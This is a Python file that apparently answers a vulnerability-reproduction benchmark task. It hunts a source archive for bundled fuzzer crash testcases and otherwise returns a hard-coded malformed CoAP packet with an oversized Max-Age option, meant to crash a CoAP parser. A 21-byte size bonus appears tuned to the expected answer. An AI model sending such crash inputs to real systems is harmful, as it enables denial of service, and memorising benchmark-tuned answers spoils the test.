import os
import re
import tarfile
from pathlib import Path
from typing import Optional, Tuple, Iterable


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
    ".md", ".markdown", ".rst", ".txt", ".cmake", ".mk",
    ".py", ".java", ".js", ".ts", ".json", ".yml", ".yaml", ".toml", ".ini",
    ".go", ".rs", ".swift", ".kt", ".kts",
    ".html", ".htm", ".css", ".xml", ".proto",
    ".sh", ".bash", ".zsh", ".fish",
    ".gradle", ".properties",
    ".csv", ".tsv",
    ".bat", ".ps1",
    ".gitignore", ".gitattributes",
    ".in", ".tmpl",
}

_NAME_PATTERNS = [
    ("clusterfuzz-testcase-minimized", 2000),
    ("clusterfuzz-testcase", 1600),
    ("minimized", 600),
    ("testcase", 900),
    ("crash", 1300),
    ("repro", 1000),
    ("poc", 1000),
    ("oss-fuzz", 400),
    ("fuzz", 250),
    ("corpus", 200),
    ("seed", 150),
    ("coap", 100),
]

_MAX_READ = 4096


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return True
    if b"\x00" in data:
        return False
    sample = data[:512]
    printable = 0
    for b in sample:
        if b in (9, 10, 13) or 32 <= b <= 126:
            printable += 1
    return printable / max(1, len(sample)) > 0.97


def _score_name(name: str, size: int) -> int:
    n = name.lower()
    score = 0
    for pat, w in _NAME_PATTERNS:
        if pat in n:
            score += w
    if size == 21:
        score += 800
    elif 1 <= size <= 256:
        score += 250
    score += max(0, 300 - min(size, 300))
    if n.endswith(".bin") or n.endswith(".raw") or n.endswith(".poc") or n.endswith(".dat"):
        score += 200
    return score


def _consider_candidate(name: str, data: bytes) -> Optional[Tuple[int, int, str, bytes]]:
    size = len(data)
    if size <= 0 or size > _MAX_READ:
        return None

    p = Path(name)
    suf = p.suffix.lower()
    strong = any(pat in name.lower() for pat, w in _NAME_PATTERNS if w >= 900)

    if suf in _TEXT_EXTS and not strong:
        return None

    if not strong and _is_probably_text(data):
        return None

    score = _score_name(name, size)
    if b"\x00" in data:
        score += 40
    if not _is_probably_text(data):
        score += 25
    return (score, size, name, data)


def _iter_tar_members(t: tarfile.TarFile) -> Iterable[tarfile.TarInfo]:
    for m in t.getmembers():
        if m.isreg() and m.size <= _MAX_READ:
            yield m


def _find_candidate_in_tar(tar_path: str) -> Optional[bytes]:
    best: Optional[Tuple[int, int, str, bytes]] = None
    try:
        with tarfile.open(tar_path, "r:*") as t:
            for m in _iter_tar_members(t):
                name = m.name
                f = t.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read(_MAX_READ)
                finally:
                    f.close()
                cand = _consider_candidate(name, data)
                if cand is None:
                    continue
                if best is None or (cand[0], -cand[1]) > (best[0], -best[1]):
                    best = cand
            if best is not None:
                return best[3]
    except tarfile.TarError:
        return None
    return None


def _find_candidate_in_dir(root: str) -> Optional[bytes]:
    best: Optional[Tuple[int, int, str, bytes]] = None
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            full = os.path.join(dirpath, fn)
            try:
                st = os.stat(full)
            except OSError:
                continue
            if not os.path.isfile(full) or st.st_size <= 0 or st.st_size > _MAX_READ:
                continue
            rel = os.path.relpath(full, root)
            try:
                with open(full, "rb") as f:
                    data = f.read(_MAX_READ)
            except OSError:
                continue
            cand = _consider_candidate(rel, data)
            if cand is None:
                continue
            if best is None or (cand[0], -cand[1]) > (best[0], -best[1]):
                best = cand
    return None if best is None else best[3]


def _default_poc() -> bytes:
    return bytes([
        0x40, 0x01, 0x00, 0x00,  # CoAP header: Ver=1, CON, TKL=0, Code=GET, MID=0
        0xD5, 0x01,              # Option: delta=14 (Max-Age), length=5
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  # 5-byte uint option value
        0xFF,                    # payload marker
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # payload
    ])


class Solution:
    def solve(self, src_path: str) -> bytes:
        if src_path and os.path.isdir(src_path):
            cand = _find_candidate_in_dir(src_path)
            if cand is not None:
                return cand
            return _default_poc()

        cand = _find_candidate_in_tar(src_path)
        if cand is not None:
            return cand

        return _default_poc()